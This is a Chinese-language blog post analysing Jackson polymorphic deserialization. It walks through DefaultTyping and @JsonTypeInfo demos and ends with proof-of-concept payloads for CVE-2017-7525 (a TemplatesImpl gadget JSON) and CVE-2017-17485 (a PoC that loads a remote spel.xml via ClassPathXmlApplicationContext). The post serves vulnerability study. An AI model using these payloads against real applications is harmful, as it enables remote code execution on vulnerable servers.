---
title: Jackson漏洞分析
date: 2021-12-15 15:16:22
categories: Java安全
tags:
- 漏洞分析
---



> 且将新火试新茶，诗酒趁年华。

Jackson漏洞学习

<!-- more -->



## 1. 前言

Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。

我们知道在序列化和反序列时候容易出现漏洞，比如fastjon跟jackson都是序列化组件，漏洞层出不穷，当然Jackson也一样，历史上产生过不少漏洞





## 2. Jackson的序列化

在jackson内部，提供了`ObjectMapper.writeValueAsString()`和`ObjectMapper.readValue()`两个方法来实现序列化和反序列化的功能。

- `ObjectMapper.writeValueAsString()`———序列化
- `ObjectMapper.readValue()`————————反序列化



添加Maven依赖

```java
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.7.9</version>
        </dependency>

        <!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core -->
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.7.9</version>
        </dependency>

        <!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations -->
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.7.9</version>
        </dependency>
```

 Demo测试

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        ObjectMapper mapper = new ObjectMapper();

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);// {"age":20,"name":"shadowtest"}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json,Student.class);
        System.out.println(stu1); //age=20, name=shadowtest


    }
}

class Student{
    public  int age;
    public String name;


    public String toString() {
        return String.format("age=%d, name=%s", age, name);
    }
}
```

此用例我们jackson的ObjectMapper创建了一个mapper对象，然后用mapper对象进行序列化与反序列化

```
ObjectMapper mapper = new ObjectMapper();
序列化：
mapper.writeValueAsString()
反序列化：
mapper.readValue()
```







## 3. Jackson多态类型的反序列化

如果对多态类进行反序列化，如何保证反序列化之后是我们想要的那个特定类呢。Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。

**JacksonPolymorphicDeserialization**具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:

- DefaultTyping
- @JsonTypeInfo注解



### 3.1 DefaultTyping

```
com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping
```

Jackson提供一个enableDefaultTyping设置，其包含4个值：

```java
    public static enum DefaultTyping {
        JAVA_LANG_OBJECT,
        OBJECT_AND_NON_CONCRETE,
        NON_CONCRETE_AND_ARRAYS,
        NON_FINAL;

        private DefaultTyping() {
        }
    }
```



#### 3.1.1  JAVA_LANG_OBJECT

当类里的属性声明为一个Object时，会对该Object进行序列化和反序列化。

通过`mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);`设置`JAVA_LANG_OBJECT`属性

我们在示例中新增一个Object对象，

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);// {"age":20,"name":"shadowtest","object":{"length":100}}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, {length=100}
    }
}

class Student{
    public int age;
    public String name;
    public Object object;


    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}
```

由结果知，反序列化的时候只反序列化了Object的属性，没有将类给反序列化出来。

如果我们添加JAVA_LANG_OBJECT属性。

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //设置JAVA_LANG_OBJECT属性
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);// {"age":20,"name":"shadowtest","object":["jackson.Boy",{"length":100}]}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, jackson.Boy@4678c730
    }
}

class Student{
    public int age;
    public String name;
    public Object object;


    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}


```

反序列化的结果:

```
{"age":20,"name":"shadowtest","object":["jackson.Boy",{"length":100}]}
age=20, name=shadowtest, jackson.Boy@4678c730
```

对比不添加JAVA_LANG_OBJECT的结果

```
{"age":20,"name":"shadowtest","object":{"length":100}}
age=20, name=shadowtest, {length=100}
```

可以知道，添加JAVA_LANG_OBJECT属性可以一个类里的Object对象也给反序列出来。





#### 3.2.2 OBJECT_AND_NON_CONCRETE

当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。

设置OBJECT_AND_NON_CONCRETE属性

```
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
```

为了测试，我们定义一个Sex接口，用MySex来继承。在Student中定义一个Sex属性，

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();
        stu.sex = new MySex();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //设置OBJECT_AND_NON_CONCRETE属性
        //mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //
    }
}

class Student{
    public int age;
    public String name;
    public Object object;
    public Sex sex;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

interface Sex {
    public void setSex(int sex);
    public int getSex();
}

class MySex implements Sex {
    int sex;

    public int getSex() {
        return sex;
    }


    public void setSex(int sex) {
        this.sex = sex;
    }
}
```

当不设置OBJECT_AND_NON_CONCRETE属性是运行报错

设置

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();
        stu.sex = new MySex();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //设置OBJECT_AND_NON_CONCRETE属性
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);// {"age":20,"name":"shadowtest","object":["jackson.Boy",{"length":100}],"sex":["jackson.MySex",{"sex":0}]}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, jackson.Boy@29ee9faa
    }
}

class Student{
    public int age;
    public String name;
    public Object object;
    public Sex sex;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

interface Sex {
    public void setSex(int sex);
    public int getSex();
}

class MySex implements Sex {
    int sex;

    public int getSex() {
        return sex;
    }


    public void setSex(int sex) {
        this.sex = sex;
    }
}
```

看出运行结果跟不开起属性没有啥区别



#### 3.2.3 NON_CONCRETE_AND_ARRAYS

支持上文全部类型的Array类型。

我们定义一个对象数组。

```JAVA
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.sex = new MySex();

        Teacher[] teachers= new Teacher[2];
        teachers[0]=new Teacher();
        teachers[1]=new Teacher();
        stu.object = teachers;

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //设置OBJECT_AND_NON_CONCRETE
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//{"age":20,"name":"shadowtest","object":["[Ljackson.Teacher;",[{"length":100},{"length":100}]],"sex":["jackson.MySex",{"sex":0}]}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, [Ljackson.Teacher;@26653222
    }
}

class Student{
    public int age;
    public String name;
    public Object object;
    public Sex sex;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

interface Sex {
    public void setSex(int sex);
    public int getSex();
}

class Teacher {
    public int length = 100;
}

class MySex implements Sex {
    int sex;

    public int getSex() {
        return sex;
    }

    public void setSex(int sex) {
        this.sex = sex;
    }
}
```

对数组进行反序列化了



#### 3.2.4 NON_FINAL

除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.sex = new MySex();

        Teacher[] teachers= new Teacher[2];
        teachers[0]=new Teacher();
        teachers[1]=new Teacher();
        stu.object = teachers;

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //设置OBJECT_AND_NON_CONCRETE
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//["jackson.Student",{"age":20,"name":"shadowtest","object":["[Ljackson.Teacher;",[["jackson.Teacher",{"length":100}],["jackson.Teacher",{"length":100}]]],"sex":["jackson.MySex",{"sex":0}]}]

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, [Ljackson.Teacher;@26653222
    }
}

class Student{
    public int age;
    public String name;
    public Object object;
    public Sex sex;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

interface Sex {
    public void setSex(int sex);
    public int getSex();
}

class Teacher {
    public int length = 100;
}

class MySex implements Sex {
    int sex;

    public int getSex() {
        return sex;
    }


    public void setSex(int sex) {
        this.sex = sex;
    }
}
```

 

#### 3.2.5 总结

DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：

| DefaultTyping类型       | 描述说明                                            |
| :---------------------- | :-------------------------------------------------- |
| JAVA_LANG_OBJECT        | 属性的类型为Object                                  |
| OBJECT_AND_NON_CONCRETE | 属性的类型为Object、Interface、AbstractClass        |
| NON_CONCRETE_AND_ARRAYS | 属性的类型为Object、Interface、AbstractClass、Array |
| NON_FINAL               | 所有除了声明为final之外的属性                       |



### 3.2 @JsonTypeInfo注解

@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：

```
@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)
```



#### 3.2.1 JsonTypeInfo.Id.NONE

设置@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)注解和不设置注解是一样的

不设置注解

```java
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();


        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//{"age":20,"name":"shadowtest","object":{"length":100}}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, {length=100}
    }
}

class Student{
    public int age;
    public String name;
    //@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
    public Object object;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

```

设置注解

```java
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//{"age":20,"name":"shadowtest","object":{"length":100}}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, {length=100}
    }
}

class Student{
    public int age;
    public String name;
    @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
    public Object object;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

```



#### 3.2.2 JsonTypeInfo.Id.CLASS

JsonTypeInfo.Id.CLASS注解，

```java
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//{"age":20,"name":"shadowtest","object":{"@class":"jackson.Boy","length":100}}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, jackson.Boy@3bfdc050
    }
}

class Student{
    public int age;
    public String name;
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
    public Object object;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

```

将关联的类也给序列化了





#### 3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS

```java
package jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {
    public static void main(String[] args) throws Exception {
        Student stu = new Student();
        stu.name="shadowtest";
        stu.age=20;
        stu.object = new Boy();

        //创建ObjectMapper对象
        ObjectMapper mapper = new ObjectMapper();

        //用jackson进行序列化
        String json=mapper.writeValueAsString(stu);
        System.out.println(json);//{"age":20,"name":"shadowtest","object":{"@c":"jackson.Boy","length":100}}

        //用jackson进行反序列化
        Student stu1 = mapper.readValue(json, Student.class);
        System.out.println(stu1); //age=20, name=shadowtest, jackson.Boy@5e3a8624
    }
}

class Student{
    public int age;
    public String name;
    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
    public Object object;

    public String toString() {
        return String.format("age=%d, name=%s, %s", age, name, object == null ? "null" : object);
    }
}

class Boy{
    public int length = 100;
}

```

可以看见@class变成了@c，缩短了相关类名



#### 3.2.4 JsonTypeInfo.Id.NAME



序列化为

```
{"age":20,"name":"shadowtest","object":{"@type":"Boy","length":100}}
```

没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。



#### 3.2.5 JsonTypeInfo.Id.CUSTOM

其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：



### 3.3 反序列总结

所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞

1、enableDefaultTyping()

2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)

3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)





## 4. 漏洞利用



### 4.1 CVE-2017-7525（基于TemplatesImpl利用链）

### 环境限制

Jackson 2.6系列 < 2.6.7.1

Jackson 2.7系列 < 2.7.9.1

Jackson 2.8系列 < 2.8.8.1

JDK版本



POC 

```
{
    "object":[
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        {
            "transletBytecodes":["xxx"],
            "transletName":"test",
            "outputProperties":{}
        }
    ]
}
```

这里解释下设置的几个JSON键值对：

- transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；
- transletName——TemplatesImpl类对象的_name属性值；
- outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；



### 4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）

Jackson 2.7系列 < 2.7.9.2

Jackson 2.8系列 < 2.8.11

Jackson 2.9系列 < 2.9.4

不受JDK限制，可直接在JDK1.8上运行。

利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。



POC

```java
public class PoC {
    public static void main(String[] args) {
        //CVE-2017-17485
        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8000/spel.xml\"]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```





## 参考

- https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/
- 





